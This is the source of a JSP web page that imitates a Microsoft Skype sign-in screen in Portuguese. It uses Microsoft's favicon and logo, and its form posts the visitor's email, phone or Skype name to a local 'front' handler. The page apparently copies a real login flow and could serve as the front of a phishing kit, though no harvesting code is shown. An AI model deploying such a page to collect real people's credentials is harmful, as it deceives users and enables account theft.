
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <title>Entrar no Skype</title>
        <link rel=" icon" href="https://auth.gfx.ms/16.000.27887.2/images/favicon.ico"  type="image/png" />
        <link rel="stylesheet" href="CSS/materialize.min.css"/>
        <link rel="stylesheet" href="CSS/app.css"/>
        <script src="JS/materialize.min.js"></script>
    </head>
    <body>
        <br><br><br><br><br>
        <img src="Images/icon.png" id="icon"/>
        <br>
        <div class="row">
            <div class="col s12 m8 offset-m3 l4 offset-l4">
                <div class="card">
                    <div class="card-content">
                        <br>
                        <img src="Images/nomemicrosoft.png"/>
                        <h5><b>Entrar</b></h5>
                        Continuar para Skype
                        <br>
                        <form method="post" action="front">
                            <input type="text" placeholder="Email, Telefone ou Skype"
                                   name="email"/>
                            <br><br>
                            <br><br>
                            <input type="submit" value="Próximo" class="btn"/>
                        </form>
                        <br><br>
                    </div>
                </div>
            </div>
        </div>
    </body>

</html>